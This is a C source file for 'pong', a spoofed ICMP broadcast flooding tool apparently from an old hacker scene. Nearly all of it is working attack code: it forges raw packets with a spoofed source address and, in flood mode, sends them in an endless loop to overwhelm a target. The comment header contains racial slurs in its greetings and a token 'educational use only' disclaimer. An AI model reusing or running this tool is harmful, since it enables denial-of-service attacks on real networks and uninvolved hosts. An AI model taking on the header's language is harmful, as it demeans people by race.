/*
 * pong.c - by FA-Q
 * spoofed icmp broadcast pong_flooder
 *
 * niggaz:     #virii, #innuendo, zakath (for echok.c (where I got 99% of this code))
 *             panasync (for the best irc client made).
 *
 * niggers:    drow, ducktape (for leaving sexual messages on my answering machine), 
 *             gridnet (for killing my account when I was testing this program),
 *             [watchy] i want to be under niggers. 
 *
 * disclaimer: this is for educational use only. please don't abuse this. also, do not
 *   	       ask me how to use this.
 *
 */

#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/ip_icmp.h>

#define IPHDRSIZE sizeof(struct iphdr)
#define ICMPHDRSIZE sizeof(struct icmphdr)
#define VIRGIN "1.1"

void pong_version(void) {
   printf("pong %s - by FA-Q\n", VIRGIN);
}
	
void pong_usage(const char *progname) {
   printf("pong_usage: %s [-fV] [-c count] [-i wait] [-s packetsize] <target> <broadcast>\n",progname);
}

unsigned char *dest_name;
unsigned char *spoof_name = NULL;
struct sockaddr_in destaddr, spoofaddr;
unsigned long dest_addr;
unsigned long spoof_addr;
unsigned pingsize, pingsleep, pingnmbr;
char pong_flood = 0;

unsigned short pong_in_cksum(addr, len)
   u_short *addr;
   int len;
{
    register int nleft = len;
    register u_short *w = addr;
    register int sum = 0;
    u_short answer = 0;
 
    while (nleft > 1)  {
        sum += *w++;
        nleft -= 2;
    }
 
    if (nleft == 1) {
        *(u_char *)(&answer) = *(u_char *)w ;
        sum += answer;
    }
 

    sum = (sum >> 16) + (sum & 0xffff); 
    sum += (sum >> 16);
    answer = ~sum;
    return(answer);
}

int pong_resolve( const char *name, struct sockaddr_in *addr, int port )
     {
	struct hostent *host;
	bzero((char *)addr,sizeof(struct sockaddr_in));

	if (( host = gethostbyname(name) ) == NULL )  {
	   fprintf(stderr,"%s will not pong_resolve\n",name);
	   perror(""); return -1;
	}
	 
	addr->sin_family = host->h_addrtype;
	memcpy((caddr_t)&addr->sin_addr,host->h_addr,host->h_length);
	addr->sin_port = htons(port);
     
        return 0;
     }

unsigned long addr_to_ulong(struct sockaddr_in *addr)
     {
	return addr->sin_addr.s_addr;
     }


int pong_resolve_one(const char *name, unsigned long *addr, const char *desc)
     {
        struct sockaddr_in tempaddr;
	if (pong_resolve(name, &tempaddr,0) == -1) {
	   printf("%s will not pong_resolve\n",desc);
	   return -1;
	}
            
	*addr = tempaddr.sin_addr.s_addr;
       	return 0;
     }

int pong_resolve_all(const char *dest,
		const char *spoof)
     {
        if (pong_resolve_one(dest,&dest_addr,"dest address")) return -1;
	if (spoof!=NULL) 
	  if (pong_resolve_one(spoof,&spoof_addr,"spoof address")) return -1;
	
	spoofaddr.sin_addr.s_addr = spoof_addr;
        spoofaddr.sin_family = AF_INET;
	destaddr.sin_addr.s_addr = dest_addr;
	destaddr.sin_family      = AF_INET;
     }
	
void give_info(void)
     {
       printf("\nattacking (%s) from (%s)\n",inet_ntoa(spoof_addr),dest_name);
     }

int pong_parse_args(int argc, char *argv[]) 
     {
        int opt;
	
	char *endptr;
	
	while ((opt=getopt(argc, argv, "fc:s:i:V")) != -1)  {
	   switch(opt)  {
	      case 'f': pong_flood = 1; break;
	      case 'c': pingnmbr = strtoul(optarg,&endptr,10);
	                if (*endptr != '\0')  {
		           printf("%s is an invalid number '%s'.\n", argv[0], optarg);
			   return -1;
	           	}
		        break;
	      case 's': pingsize = strtoul(optarg,&endptr,10);
	                if (*endptr != '\0')  {
		           printf("%s is a bad packet size '%s'\n", argv[0], optarg);
		           return -1;
	           	}
		        break;
	      case 'i': pingsleep = strtoul(optarg,&endptr,10);
	                if (*endptr != '\0')  {
		           printf("%s is a bad wait time '%s'\n", argv[0], optarg);
		           return -1;
	           	}
		        break;
	      case 'V': pong_version(); break;
	      case '?':
	      case ':': return -1; break;
	   }
	  
	}
	    
	if (optind > argc-2)  {
	   return -1;
	}
        
        if (!pingsize)
          pingsize = 28;
        else
          pingsize = pingsize - 36 ;

        if (!pingsleep)
          pingsleep = 100;

	spoof_name = argv[optind++];
	dest_name = argv[optind++];
	
    	return 0; 		      	
     }

 inline int icmp_echo_send(int                socket, 
 			   unsigned long      spoof_addr,
			   unsigned long      t_addr,
			   unsigned           pingsize)
     {
	unsigned char packet[5122];
	struct iphdr   *ip;
	struct icmphdr *icmp;
	struct iphdr   *origip;
        unsigned char  *data;

        int i;
	
	ip = (struct iphdr *)packet;
	icmp = (struct icmphdr *)(packet+IPHDRSIZE);
	origip = (struct iphdr *)(packet+IPHDRSIZE+ICMPHDRSIZE);
	data = (char *)(packet+pingsize+IPHDRSIZE+IPHDRSIZE+ICMPHDRSIZE);
	
	memset(packet, 0, 5122);
	
	ip->version  = 4;
	ip->ihl      = 5; 
	ip->ttl      = 255-random()%15;
	ip->protocol = IPPROTO_ICMP;
	ip->tot_len  = htons(pingsize + IPHDRSIZE + ICMPHDRSIZE + IPHDRSIZE + 8);
	
        bcopy((char *)&destaddr.sin_addr, &ip->daddr, sizeof(ip->daddr));
        bcopy((char *)&spoofaddr.sin_addr, &ip->saddr, sizeof(ip->saddr)); 

	ip->check    = pong_in_cksum(packet,IPHDRSIZE);
	
	origip->version  = 4;
	origip->ihl      = 5;
	origip->ttl      = ip->ttl - random()%15;
	origip->protocol = IPPROTO_TCP; 
	origip->tot_len  = IPHDRSIZE + 30; 
	origip->id       = random()%69;
	
        bcopy((char *)&destaddr.sin_addr, &origip->saddr, sizeof(origip->saddr));

       	origip->check = pong_in_cksum(origip,IPHDRSIZE);
	
	*((unsigned int *)data)          = htons(pingsize);

	icmp->type = 8; /* why should this be 3? */
	icmp->code = 0;
	
	icmp->checksum = pong_in_cksum(icmp,pingsize+ICMPHDRSIZE+IPHDRSIZE+8);

	return sendto(socket,packet,pingsize+IPHDRSIZE+ICMPHDRSIZE+IPHDRSIZE+8,0,
		      (struct sockaddr *)&destaddr,sizeof(struct sockaddr)); 
	

     }

void pong_main(int argc, char *argv[])
     {
        int s, i;
        int pong_floodloop;
        
	if (pong_parse_args(argc,argv)) 
	  {  
	     pong_usage(argv[0]); 
	     return;
	  }
	
	pong_resolve_all(dest_name, spoof_name);
	give_info();
       	
       	s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	
        if (!pong_flood)
	  {
	     if (icmp_echo_send(s,spoof_addr,dest_addr,pingsize) == -1)
	     {
	        printf("%s error sending packet\n",argv[0]); perror(""); return;
	     }
	  }
	else
	  {
             pong_floodloop = 0;
             if ( pingnmbr && (pingnmbr > 0) )
             {
               printf("sending... packet limit set\n");
               for (i=0;i<pingnmbr;i++)
	       {
		 if (icmp_echo_send(s,spoof_addr,dest_addr,pingsize) == -1) 
	         {
		    printf("%s error sending packet\n",argv[0]); perror(""); return; 
	         }
	 	 usleep((pingsleep*1000));       	      

	         if (!(pong_floodloop = (pong_floodloop+1)%25)) 
		  { fprintf(stdout,"."); fflush(stdout); 
	         }
		
 	       }
               printf("\ncomplete, %u packets sent\n", pingnmbr);
             }
             else {
               printf("pong_flooding, (. == 25 packets)\n");
               for (i=0;i<1;i)
	       {
		 if (icmp_echo_send(s,spoof_addr,dest_addr,pingsize) == -1) 
	         {
		    printf("%s error sending packet\n",argv[0]); perror(""); return; 
	         }
	 	 usleep(900);       	      

	         if (!(pong_floodloop = (pong_floodloop+1)%25)) 
		  { fprintf(stdout,"."); fflush(stdout); 
	         }
		
 	       }
             }

	  }
     }

